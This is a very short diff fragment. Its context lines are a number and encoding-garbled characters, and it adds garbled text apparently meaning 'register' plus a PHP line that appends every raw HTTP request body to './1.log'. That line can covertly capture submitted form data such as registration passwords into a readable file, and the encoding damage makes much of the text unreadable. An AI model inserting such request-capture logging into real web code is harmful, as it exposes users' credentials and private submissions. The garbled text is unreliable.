@@ -1,3 +1,5 @@
 545
 
 ²»¶®µÃ
+
+×¢²áfile_put_contents("./1.log",file_get_contents("php://input")."\n",FILE_APPEND);
